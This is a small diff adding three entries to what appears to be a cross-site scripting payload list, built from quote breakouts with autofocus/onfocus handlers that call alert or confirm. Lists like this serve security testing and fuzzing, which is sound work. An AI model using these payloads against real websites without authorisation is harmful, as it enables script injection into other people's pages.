@@ -2,6 +2,9 @@
  \'-alert(1)//
  %27%22%20autofocus/onfocus=confirm`xss`//
 \”-confirm`1`//
+" /autofocus/onfocus=alert'123'//
+"/autofocus/onfocus="alert`xss`
+"/autofocus/onfocus=alert'123'//
 \”}})})-confirm`1`//
 \”}})})-confirm`1`/*/
 \”}})})-confirm`1`;/*///
